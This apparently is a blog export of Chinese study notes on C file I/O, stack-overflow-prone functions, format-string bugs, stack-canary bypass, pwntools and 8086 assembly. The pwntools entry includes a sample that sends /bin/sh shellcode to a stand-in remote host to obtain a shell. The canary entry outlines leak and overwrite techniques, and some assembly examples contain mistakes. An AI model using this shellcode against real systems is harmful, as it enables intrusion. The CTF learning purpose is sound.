    <content type="text"><![CDATA[open简介打开设备文件不带缓冲区非缓冲文件系统依赖于操作系统，通过操作系统的功能对文件进行读写，是系统级的输入输出，它不设文件结构体指针，只能读写二进制文件，但效率高、速度 快 函数原型1234567int open(const char *pathname, int flags);int open(const char *pathname, int flags, mode_t mode);所需库：#include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; 返回值成功则返回文件描述符，否则返回 -1; 参数说明参数 pathname 指向欲打开的文件路径字符串. 下列是参数flags 所能使用的旗标: O_RDONLY 以只读方式打开文件 O_WRONLY 以只写方式打开文件 O _RDWR 以可读写方式打开文件. 上述三种旗标是互斥的, 也就是不可同时使用, 但可与下列的旗标利用OR(|)运算符组合. O_CREAT 若欲打开的文件不存在则自动建立该文件. O_EXCL 如果O_CREAT 也被设置, 此指令会去检查文件是否存在. 文件若不存在则建立该文件, 否则将导致打开文件错误. 此外, 若O_CREAT 与O_EXCL 同时设置, 并且欲打开的文件为符号连接, 则会打开文件失败. O_NOCTTY 如果欲打开的文件为终端机设备时, 则不会将该终端机当成进程控制终端机. O_TRUNC 若文件存在并且以可写的方式打开时, 此旗标会令文件长度清为0, 而原来存于该文件的资料也会消失. O_APPEND 当读写文件时会从文件尾开始移动, 也就是所写入的数据会以附加的方式加入到文件后面. O_NONBLOCK 以不可阻断的方式打开文件, 也就是无论有无数据读取或等待, 都会立即返回进程之中. O_NDELAY 同O_NONBLOCK. O_SYNC 以同步的方式打开文件. O_NOFOLLOW 如果参数pathname 所指的文件为一符号连接, 则会令打开文件失败. O_DIRECTORY 如果参数pathname 所指的文件并非为一目录, 则会令打开文件失败。注：此为Linux2. 2 以后特有的旗标, 以避免一些系统安全问题. 参数mode 则有下列数种组合, 只有在建立新文件时才会生效, 此外真正建文件时的权限会受到umask 值所影响, 因此该文件权限应该为 (mode-umaks). S_IRWXU00700 权限, 代表该文件所有者具有可读、可写及可执行的权限. S_IRUSR 或S_IREAD, 00400 权限, 代表该文件所有者具有可读取的权限. S_IWUSR 或S_IWRITE, 00200 权限, 代表该文件所有者具有可写入的权限. S_IXUSR 或S_IEXEC, 00100 权限, 代表该文件所有者具有可执行的权限. S_IRWXG 00070 权限, 代表该文件用户组具有可读、可写及可执行的权限. S_IRGRP 00040 权限, 代表该文件用户组具有可读的权限. S_IWGRP 00020 权限, 代表该文件用户组具有可写入的权限. S_IXGRP 00010 权限, 代表该文件用户组具有可执行的权限. S_IRWXO 00007 权限, 代表其他用户具有可读、可写及可执行的权限. S_IROTH 00004 权限, 代表其他用户具有可读的权限 S_IWOTH 00002 权限, 代表其他用户具有可写入的权限. S_IXOTH 00001 权限, 代表其他用户具有可执行的权限. 返回值：若所有欲核查的权限都通过了检查则返回0 值, 表示成功, 只要有一个权限被禁止则返回-1. 错误代码： EEXIST 参数pathname 所指的文件已存在, 却使用了O_CREAT 和-O_EXCL 旗标. EACCESS 参数pathname 所指的文件不符合所要求测试的权限. EROFS 欲测试写入权限的文件存在于只读文件系统内. EFAULT 参数pathname 指针超出可存取内存空间. EINVAL 参数mode 不正确. ENAMETOOLONG 参数 pathname 太长. ENOTDIR 参数pathname 不是目录. ENOMEM 核心内存不足. ELOOP 参数pathname 有过多符号连接问题. EIO I/O 存取错误. fopen简介打开普通文件带缓冲区缓冲文件系统是借助文件结构体指针来对文件进行管理，通过文件指针来对文件进行访问，既可以读写字符、字符串、格式化数据，也可以读写二进制数据。 函数原型12#include&lt;stdio.h&gt;FILE * fopen(const char * path,const char * mode); 返回值文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回NULL，并把错误代码存在errno 中。 参数说明参数path字符串包含欲打开的文件路径及文件名，参数mode字符串则代表着流形态。mode有下列几种形态字符串:r 以只读方式打开文件，该文件必须存在。r+ 以可读写方式打开文件，该文件必须存在。rb+ 读写打开一个二进制文件，允许读写数据。rw+ 读写打开一个文本文件，允许读和写。w 打开只写文件，若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件。w+ 打开可读写文件，若文件存在则文件长度清为零，即该文件内容会消失。若文件不存在则建立该文件。a 以附加的方式打开只写文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾，即文件原先的内容会被保留。（EOF符保留）a+ 以附加方式打开可读写的文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾后，即文件原先的内容会被保留。 （原来的EOF符不保留）wb 只写打开或新建一个二进制文件；只允许写数据。wb+ 读写打开或建立一个二进制文件，允许读和写。ab+ 读写打开一个二进制文件，允许读或在文件末追加数据。at+ 打开一个叫string的文件，a表示append,就是说写入处理的时候是接着原来文件已有内容写入，不是从头写入覆盖掉，t表示打开文件的类型是文本文件，+号表示对文件既可以读也可以写。上述的形态字符串都可以再加一个b字符，如rb、w+b或ab+等组合，加入b 字符用来告诉函数库以二进制模式打开文件。如果不加b，表示默认加了t，即rt,wt,其中t表示以文本模式打开文件。由fopen()所建立的新文件会具有S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH(0666)权限，此文件权限也会参考umask 值。有些C编译系统可能不完全提供所有这些功能，有的C版本不用”r+”,”w+”,”a+”,而用”rw”,”wr”,”ar”等，读者注意所用系统的规定。 popen函数原型12#include&lt;stdio.h&gt;FILE * popen ( const char * command , const char * type ); 返回值如果调用 fork() 或 pipe() 失败，或者不能分配内存将返回NULL，否则返回标准 I/O 流。 参数说明type 参数只能是读或者写中的一种，得到的返回值（标准 I/O 流）也具有和 type 相应的只读或只写类型。如果 type 是 “r” 则文件指针连接到 command 的标准输出；如果 type 是 “w” 则文件指针连接到 command 的标准输入。command 参数是一个指向以 NULL 结束的 shell 命令字符串的指针。这行命令将被传到 bin/sh 并使用-c 标志，shell 将执行这个命令。]]></content>
      <categories>
        <category>c</category>
      </categories>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓冲文件系统和非缓冲文件系统]]></title>
    <url>%2F2018%2F11%2F05%2F%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%92%8C%E9%9D%9E%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[前言1983 年ANSI C 标准决定不采用非缓冲文件系统，而只采用缓冲文件系统。即用缓冲文件系统处理文本文件，也用它来处理二进制文件。也就是将缓冲文件系统扩充为可以处理二进制文件。 缓冲文件系统特点自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。 作用用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。 代表函数缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等 非缓冲文件系统特点非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。 代表函数缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈溢出常见函数]]></title>
    <url>%2F2018%2F11%2F04%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[0x00 read()函数原型12#include &lt;unistd.h&gt;ssize_t read (int fd, void *buf, size_t nbyte) fd：文件描述符；fd为0从键盘读取buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要读入文件指定的字节数； 功能read()会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。 返回值成功时,read返回实际所读的字节数,如果返回的值是0,表示已经读到文件的结束了.小于0表示出现了错误.如果错误为EINTR说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题. 0x01 write()函数原型12#include &lt;unistd.h&gt;ssize_t write(int fd,const void *buf,size_t nbytes) fd：文件描述符；fd为1输出到显示器buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要写入文件指定的字节数； 功能write()会把参数buf 所指的内存写入nbytes 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动. 返回值如果顺利write()会返回实际写入的字节数.当有错误发生时则返回-1, 错误代码存入errno 中. 错误代码： EINTR 此调用被信号所中断. EAGAIN 当使用不可阻断I/O 时 (O_NONBLOCK), 若无数据可读取则返回此值. EADF 参数fd 非有效的文件描述词, 或该文件已关闭 0x02 gets()函数原型12# include &lt;stdio.h&gt;char *gets(char *str); 功能gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。 注意使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。这就意味着，如果前面使用过 gets()，而后面又要从键盘给字符变量赋值的话就不需要吸收回车清空缓冲区了，因为缓冲区的回车已经被 gets() 取出来扔掉了 gets() 时有空格也可以直接输入，但是 gets() 有一个非常大的缺陷，即它不检查预留存储区是否能够容纳实际输入的数据，换句话说，如果输入的字符数目大于数组的长度，gets 无法检测到这个问题，就会发生内存越界。 0x03 strcpy()和memcpy()和strncpy()函数原型123char* strcpy(char* dest, const char* src)void *memcpy( void *dest, const void *src, size_t count );char *strncpy(char *dest,char *src,int size_t n); dest:指向用于存储复制内容的目标数组。src:要复制的字符串。count：要读入文件指定的字节数； 注意 strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容之外，还会复制字符串的结束符’\0’。 复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。 复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。 用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy strncpy函数，只是将src的前n个字符复制到dest的前n个字符，不自动添加’\0’。如果src的长度小于n个字节，则以NULL填充dest直到复制完n个字节 0x04 printf()和scanf()scanf函数scanf(“%d %d”,&amp;a,&amp;b);遇到空格(0x20)停止读取 printf函数printf(“%s”, i);输出直到\x00 格式化字符串漏洞通常来说，我们会使用printf([格式化字符串]，参数)的形式来进行调用，例如12char s[20] = “Hello world!\n”;printf(“%s”, s); 然而，有时候为了省事也会写成12char s[20] = “Hello world!\n”;printf(s); 事实上，这是一种非常危险的写法。由于printf函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[stack canary绕过思路]]></title>
    <url>%2F2018%2F10%2F24%2Fstack-canary%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[0x00 canary保护机制我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖ebp、eip等，从而达到劫持控制流的目的。然而stack canary这一技术的应用使得这种利用手段变得难以实现。 canary保护机制是在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的canary值（最后两位必须是00），栈帧销毁前测试该值是否“死掉”，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。 如图var-c就是canary的地址，如果触发了栈溢出漏洞，还不知道canary的值，就会执行__stack_chk_fail函数。 0x01 泄露canary泄露canary的方法有： 通过格式化字符串漏洞来泄露canary的值 通过栈溢出漏洞来泄露canary的值 多进程程序的canary爆破 利用__stack_chk_fail函数泄露信息 当然具体问题还要具体分析 0x02 修改canarytls结构里面存储着 canary ，程序退出时，比对的就是tls结构里面的canary 修改 tls 里面的 canary 为我们伪造的即可绕过。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwntools]]></title>
    <url>%2F2018%2F09%2F19%2Fpwntools%2F</url>
    <content type="text"><![CDATA[pwntoolspwntools是一个ctf框架和漏洞利用开发库，用python开发，旨在让使用者简单快速的编写exploit。python2安装方法： sudo pip install pwntoolspython3安装方法： sudo pip3 install pwntools IO模块下面给出了PwnTools中的主要IO函数。1234567891011send(data) : 发送数据sendline(data) : 发送一行数据，相当于在末尾加\nrecv(numb=4096, timeout=default) : 给出接收字节数,timeout指定超时recvuntil(delims, drop=False) : 接收到delims的pattern（以下可以看作until的特例）recvline(keepends=True) : 接收到\n，keepends指定保留\nrecvall() : 接收到EOFrecvrepeat(timeout=default) : 接收到EOF或timeoutinteractive() : 与shell交互 ELF模块ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。 下面演示了：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址123456789&gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)&gt;&gt;&gt; print hex(e.address) # 文件装载的基地址0x400000&gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;]) # 函数地址0x401680&gt;&gt;&gt; print hex(e.got[&apos;write&apos;]) # GOT表的地址0x60b070&gt;&gt;&gt; print hex(e.plt[&apos;write&apos;]) # PLT的地址0x401680 数据处理主要是对整数进行打包，就是转换成二进制的形式，比如转换成地址。p32、p64是打包，u32、u64是解包。数据打包,即将整数值转换为32位或者64位地址一样的表示方式,比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便 用法: p32/p64: 打包一个整数,分别打包为32或64位 u32/u64: 解包一个字符串,得到整数 大致框架官网的一个简单样例 123456789from pwn import *context(arch = &apos;i386&apos;, os = &apos;linux&apos;) ;设置目标机的信息r = remote(&apos;exploitme.example.com&apos;, 31337) ;用来建立一个远程连接，url或者ip作为地址 然后指明端口,这里也可以仅仅使用本地文件,调试时方便:r.send(asm(shellcraft.sh())) ;r.send()将shellcode发送到远程连接r.interactive() ;将控制权交给用户，这样就可以使用打开的shell了 Context设置context是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。 一般来说我们设置context只需要简单的一句话: context(os=’linux’, arch=’amd64’, log_level=’debug’) 这句话的意思是： os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。 汇编与shellcode有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。首先，常用的，也是最简单的shellcode，即调用/bin/sh可以通过shellcraft得到： 注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。1print(shellcraft.sh()) # 打印出shellcode 不过，现在我们看到的shellcode还是汇编代码，不是能用的机器码，所以还需要进行一次汇编1print(asm(shellcraft.sh())) # 打印出汇编后的shellcode asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。如果需要更复杂一些的汇编功能，可以使用keystone-engine项目，这里就不再赘述了。 asm也是架构相关，所以一定要先设置context，避免一些意想不到的错误。]]></content>
      <categories>
        <category>pwntools</category>
      </categories>
      <tags>
        <tag>pwntools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cmp指令]]></title>
    <url>%2F2018%2F09%2F16%2Fcmp%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。cmp指令格式：cmp操作对象1，操作对象2功能：计算操作对象1-操作对象2但不保存结果，仅仅根据计算结果对标志寄存器进行设置。 指令cmp ax，bx的逻辑含义是比较ax，bx中的值，如果执行后：zf=1，说明(ax)=(bx)zf=0，说明（ax）不等于（bx）cf=1，说明（ax）&lt;(bx)cf=0，说明（ax)&gt;=(bx)cf=0且zf=0，说明（ax）&gt;(bx)cf=1或zf=1,说明(ax)&lt;=(bx）]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sbb指令]]></title>
    <url>%2F2018%2F09%2F16%2Fsbb%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[sbb是带减法指令，它利于了CF位上记录的错位置。指令格式：sbb 操作对象1，操作对象2功能：操作对象1=操作对象1-操作对象2-CF例如：1234mov bx,1000Hmov ax,003EHsub bx,2000Hsbb ax,0020H sbb指令执行后，将对CF进行设置。利用sbb指令可以对任意大的数据进行减法运算。上面程序，就是计算003E1000H-00202000H]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[adc指令]]></title>
    <url>%2F2018%2F09%2F16%2Fadc%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[adc是带进位加法指令指令格式：adc 操作对象1，操作对象2功能：操作对象1=操作对象1+操作对象2+CF 例如：1234mov ax,2mov bx,1sub bx,axadc ax,1 执行后，（ax）=4,abc执行时想，相当于计算：（ax）+1+CF=2+1+1=4adc指令的目的，就是来进行假发的第二步运算的。adc指令和add指令相配合就可以对更大的数据进行加法运算。]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[检测点11.1]]></title>
    <url>%2F2018%2F09%2F16%2F%E6%A3%80%E6%B5%8B%E7%82%B911-1%2F</url>
    <content type="text"><![CDATA[写出下面每条指令执行后，ZF、PF、SF、等标志位的值。12345678910111213sub al,al al=0h ZF=1 PF=1 SF=0 mov al,1 al=1h ZF=1 PF=1 SF=0 push ax ax=1h ZF=1 PF=1 SF=0 pop bx bx=1h ZF=1 PF=1 SF=0 add al,bl al=2h ZF=0 PF=0 SF=0 add al,10 al=12h ZF=0 PF=1 SF=0 mul al ax=144h ZF=0 PF=1 SF=0]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[标志寄存器]]></title>
    <url>%2F2018%2F09%2F16%2F%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
    <content type="text"><![CDATA[标志寄存器（简称flag）的作用：（1）用来存储相关指令的某些执行结果。（2）用来为CPU执行相关指令提供行为依据。（3）用来控制CPU的相关工作方式。flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器死按位起作用的，它的每一位都有专门的含义，记录特定的信息。 flag的1,3,5,12,13,14,15位在8086CPU中没有使用，不具有任何含义 ZF标志flag的第六位是ZF，零标志位。它记录相关指令执行后，其结果是否为0.如果结果为0，那么zf=1，如果结果不为0，那么zf=0 例如指令：12mov ax,1sub ax,1 执行后，结果为0，则zf=1 PF标志flag的第二位是PF，奇偶标志位，它记录相关指令执行后，其结果的所有bit位中1的个数是否位偶数。如果1的个数为偶数，pf=1，如果为奇数，那么pf=0比如指令：12mov ax,1add al,10 执行后，结果为00001011B，其中有3个1，则pf=0 SF标志flag的第七位是SF，符号标志位，它记录相关指令后，其结果是否为负。如果结果为负，sf=1，如果不为负，sf=0计算机通常用补码来表示有符号数据。计算机的UI个数据可以看做是由富豪书，也可以看做成无符号数。比如：00000001B，可以看做无符号数1，或有符号数+1；10000001B，可以看做无符号数129，也可以看作有符号数-127不管我们如何看待，CPU在执行add等指令的时候，就已经包含了两种含义，也将得到同一种信息来记录的两种结果。关键在于我们的程序需要哪一种结果。比如：12mov al,10000001Badd al,1 执行后，结果为10000010B，sf=1，表示：如果指令进行的是有符号数运算，那么结果为负；12mov al,100000001Badd al,011111111B 执行后，结果为0，sf=0，表示：如果指令进行的是有符号数运算，那么结果为非负。某些指令将影响寄存器中的多个标记为，这些被影响的标记位比较全面地记录了指令的执行结果，为相关的处理提供了所需的依据。比如指令sub，al，al执行后，ZF、PF、SF等标志位都要受到影响，它们分别为：1,1,0。 CF标志位flag的第0位是CF，进位标志位，一般情况下，在进行无符号运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。比如，123mov al,98Hadd al,al 执行后：（al）=30H，CF=1，CF记录了从最高有效位向更高位的进位值add al,al 执行后：（al）=60H，CF=0 而当两个数据做减法的时候，有可能向更高位借位，比如：123mov al,97Hsub al,98H ；执行后（al）=FFH，CF=1，CF记录了向更高位的借位值sub al,al ：执行后（al）=0，CF=0，CF记录了向更高位借位值 OF标志位flag的第十一位是OF，溢出标志位。一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生溢出，OF=1；如果没有，OF=0.对于无符号数运算，98+99没有进位，CF=0；对于有符号数运算，98+99发生溢出，OF=1例如：12mov al,F0Hadd al,88H add指令执行后：CF=1，OF=0.对于无符号运算，F0H+78H有进位，CF=1；对于有符号数运算，F0H+78H不发生溢出，OF=0 DF标志位flag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si，di的增减。df=0 每次操作后si、di递增df=1 每次操作后si、di递减]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mul指令]]></title>
    <url>%2F2018%2F09%2F16%2Fmul%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[mul指令是乘法指令规定：（1）两个相乘的数，要么都是8位，要么都是16位，如果是8位，一个默认放在AL中，另一个放在8位reg或内存字单元中：如果是16位，一个默认放在AX中，另一个放在16位reg或内存子单元中。（2）结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认放在DX中存放，低位在AX中放。 例如：（1）计算100*10100和10 都小于255，可以做8位陈发，程序如下。123mov al,100mov bl,10mul bl 结果（ax）=1000（03E8H）（2）计算100*10000100小于255，可10000大于255，所以必须做16位乘法，程序如下：123mov ax,100mov bx,10000mul bx 结果：(ax)=4240H,(dx)=000FH (F4240H=100000)]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[call指令]]></title>
    <url>%2F2018%2F09%2F12%2Fcall%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[CPU执行call指令时，进行两步操作：（1）将当前的IP或CS和IP压入栈中；（2）转移call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。 call 标号依据位移进行转移的call指令CPU执行 “call 标号”指令时，进行如下操作：（1）(sp)=(sp)-2((ss)*16+(sp))=(IP)(2) (IP)=(IP)+16位位移。 16位位移=标号处的地址-call指令后的第一个直接的地址；16位位移的范围为-32768~32767，用补码表示；16位位移由编译程序在编译时算出。 CPU执行”call 标号”时，用汇编语言解释，相当于进行：push IPjmp near ptr 标号 call far ptr 标号转移的目的之地在指令中的call指令CPU执行”call far ptr 标号”指令时，进行如下的操作：(1) (sp)=(sp)-2((ss)*16+（sp))=(CS) (sp)=(sp)-2((ss)*16+(sp0=（IP）(2)(CS)=标号所在段的段地址（IP）=标号在段中的偏移地址 CPU执行”call far ptr 标号”时，用汇编语言解释，相当于进行：push CSpush IPjmp far ptr 标号 call 16 位 reg转移地址在寄存器中的call指令功能：(sp)=(sp)-2((ss)*16+(sp))=(IP)(IP)=(16位reg) 用汇编语言解释，相当于进行：push IPjmp 16位 reg call word ptr 内存单元地址转移地址在内存中的call指令 用汇编语言解释，相当于进行：push IPjmp word ptr 内存单元地址 比如：1234mov sp,10hmov as,0123hmov ds:[0],axcall word ptr ds:[0] 执行后，（IP）=0123H，（sp）=0EH call dword ptr 内存单元地址转移地址在内存中的call指令 用汇编语言解释，相当于进行：push CSpush IPjmp word ptr 内存单元地址 比如：12345mov sp,10hmov as,0123hmov ds:[0],axmov word ptr ds:[2],0call dword ptr ds:[0] 执行后，（CS）=0，（IP）=0123H，（sp）=0CH call和ret的配合使用call和ret配合使用来实现子程序先分析一下代码：12345678910111213assume cs:codecode segmentstart: mov ax,1 mov cx,3 call s mov bx,ax mov ax,4c00h int 21h s: add ax,bx loops retcode endsend start CPU执行这个程序的主要过程可以写一个具有一定功能的程序段，我们称其为子程序，在需要的时候，用call指令去执行。可是执行完子程序后，如何让CPU接着call指令向下执行？call指令去执行子程序之前，call指令后面的指令的地址将存储在栈中，所以可在子程序后面使用ret指令，用栈中的数据设置IP的值，从而转到call指令后面的代码处继续执行。 具有子程序的源程序的框架如下:123456789101112131415161718192021assume cs:codecode segmentmain: : : call sub1 : : mov ax,4c00h int 21hsub1: : : call sub2 : : retsub2: : : retcode endsend main]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[检测点10.1-10.5]]></title>
    <url>%2F2018%2F09%2F12%2F%E6%A3%80%E6%B5%8B%E7%82%B910-1-10-5%2F</url>
    <content type="text"><![CDATA[10.1补全程序，实现从内存1000:0000处开始执行指令1234567891011121314151617181920assume cs:codestack segmentdb 16 dup (0)stack endscode segmentmov ax,4c00hint 21hstart: mov ax,stackmov ss,axmov sp,16mov ax,0push axmov ax,1000hretfcode endsend start 程序分析： retf指令作用（CPU角度）：从栈中弹出2个字单元，并修改CS（第二个字）和IP（第一个字）；首先它弹出的是IP，其次是CS，故在压栈时，CS的值首先入栈，IP再入栈。 在汇编编程角度，retf实现了远转移。 讲解：在汇编代码这个层次，retf指令作用是修改CS和IP的值，进而使指令从修改后的地址处开始执行。由于它所依赖的是栈中存储的内容，故在压栈过程中要搞清楚入栈的顺序、入栈的值。 2.熟悉ret指令和RETF指令执行的操作。 我们编译链接后，debug跟踪check10-1.exe -d ss:0 0B66:0000 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ……………. 在stack数据区中初始化了16个0，此时它未成为栈结构。直到初始化栈的结构。 执行代码t t（二次） AX=0B66 BX=0000 CX=0026 DX=0000 SP=0010 BP=0000 SI=0000 DI=0000 DS=0B56 ES=0B56 SS=0B66 CS=0B67 IP=0008 NV UP EI PL NZ NA PO NC 0B67:0008 B80010 MOV AX,1000 -d ss:00 0B66:0000 00 00 00 00 00 00 66 0B-00 00 08 00 67 0B 68 05 ……f…..g.h. 初始化一个栈sp=0010H（16），栈地址：ss=0b66，这里我们发现一些不应该有的数据（不理会它，它是中断的信息） 继续执行代码： -d ss:0 0B66:0000 00 00 00 00 00 00 10 00-67 0B 68 05 00 00 00 10 ……..g.h….. 发现从高位开始存储10 00 00 00四个字节的数据，（体会栈是从高地址向低地址发展的，sp指针从10H减少到了0cH） 此时的CS=0B67 IP=0010 执行retf代码： 我们发现：CS=1000 IP=0000，CS和IP的值改变了。 总结：ret和RETF依赖于栈的结构存储一个程序执行点（IP或CS和IP），当执行这个代码时，可以恢复到这个程序的执行点（将栈中的数据修改IP或CS和IP，使CPU指向新的CS：IP） 10.2下面的程序执行后，ax中的数值为多少？12345678910内存地址 机器码 汇编指令 执行后情况1000:0 b8 00 00 mov ax,0 ax=0 ip指向1000:31000:3 e8 01 00 call s 读取指令后IP指向下一条指令IP为6;push 61000:6 40 inc ax1000:7 58 s:pop ax ax=6 “call 标号”是将该指令后的第一个字节偏移地址入栈，再转到标号处执行指令。 10.3下面的程序执行后，AX中的数值为多少？1234567891011内存地址 机器码 汇编指令 1000：0 b8 00 00 mov ax,0 1000：3 9A 09 00 00 10 call far ptr s ;cs为1000h，ip为8， push 1000h，push 81000：8 40 inc ax 1000：9 58 s: pop ax ;ax=8h add ax,ax ;ax=10h pop bx ;bx=1000h add ax,bx ;ax=1010h 执行call far ptr s时，取IP为8,add ax,ax ax=16BX=CS=1000H 相加转16进制ax=1010H 10.4下面的程序执行后，AX中的数值为多少？123456内存地址 机器码 汇编指令 1000：0 b8 06 00 mov ax,6 1000：3 ff d0 call ax1000：5 40 inc ax 1000：6 mov bp,sp add ax,[bp] 在执行了call ax的时候指令寄存器会指向下一条指令的起始地址，也就是1000:5 inc ax然后指令寄存器ip=5要压入堆栈然后跳转到cs:ax指定的地址执行又因为此时ax中的值为6 ,cs=1000所以跳转到1000:6执行于是修改 ip为6到此时call ax指令才执行完毕 然后就执行mov bp,sp因为sp里面放的是堆顶的地址，所以bp也是栈顶的地址了之后add ax,[bp]因为，bp里面放的是栈顶的地址，所以 [bp] 寄存器寻址后 [bp]实际是代表该地址单元的内容，也就是栈顶的内容，因为先前我把ip压入了堆栈，所以[bp]得到的内容就是5(先前在call ax时候压入的ip的值) 所以 ax=ax+[bp]也就是 ax=6+5=0BH 10.5题目：下面的程序执行后，ax中的数据是多少？123456789101112131415161718assume cs:code stack segment dw 8 dup (0) stack ends code segment start :mov ax,stack mov ss,ax mov sp,16 mov ds,ax mov ax,0 call word ptr ds:[0eH] inc ax inc ax inc ax code ends end start 解答：刚开始时mov ax,stack到mov sp,10h是分别设置ss：sp指向程序中定义的栈段stack。mov ds,ax也把数据段的段地址也设置成了stack段的段地址。call word prt ds:[0Eh]相当于是sp=sp-2，push ip，jmp word ptr 